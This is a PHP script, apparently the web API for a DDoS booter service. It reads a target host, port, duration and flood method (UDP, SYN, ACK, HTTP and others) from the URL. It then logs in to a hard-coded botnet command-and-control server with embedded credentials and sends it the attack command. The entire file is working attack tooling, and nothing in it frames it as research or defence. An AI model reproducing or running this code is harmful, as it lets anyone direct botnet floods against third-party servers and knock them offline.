<?php
//API Link: http://ServerIP/API.php?&host=$host&port=$port&time=$time&type=$method
set_time_limit(3);
 
$server = "89.38.96.67";
$conport = 420;
$username = "root";
$password = "dox";
 
$activekeys = array();
 
$method = $_GET['type'];
$target = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];
 $command = "m";
if($method == "UDP"){$command = "!* UDP $target $port $time 32 15 8";}
if($method == "TCP"){$command = "!* TCP $target $port $time 32 all 15 8";}
if($method == "STD"){$command = "!* STD $target $port $time";}
if($method == "SYN"){$command = "!* TCP $target $port $time 32 syn 15 8";}
if($method == "ACK"){$command = "!* TCP $target $port $time 32 ack 15 8";}
if($method == "RST"){$command = "!* TCP $target $port $time 32 rst 15 8";}
if($method == "FIN"){$command = "!* TCP $target $port $time 32 fin 15 8";}
if($method == "HTTP"){$command = "!* TCP $target $port $time 32 all 10 10";}
if($method == "HOLD"){$command = "!* UDP $target $port $time 32 10 10";}
if($method == "JUNK"){$command = "!* UDP $target $port $time 32 10 10";}
if($method == "STOP"){$command = "!* KILLATTK";}
 
$sock = fsockopen($server, $conport, $errno, $errstr, 20);
 
if(!$sock){
        echo "Couldn't Connect To CNC Server...";
} else{
        fread($sock, 512);
        fwrite($sock, $username . "\n");
        fread($sock, 512);
        fwrite($sock, $password . "\n");
        if(fread($sock, 512)){
               fread($sock, 512);
        }
 
        fwrite($sock, $command . "\n");
        fread($sock, 512);
        fclose($sock);
        echo "Sent";
}
?>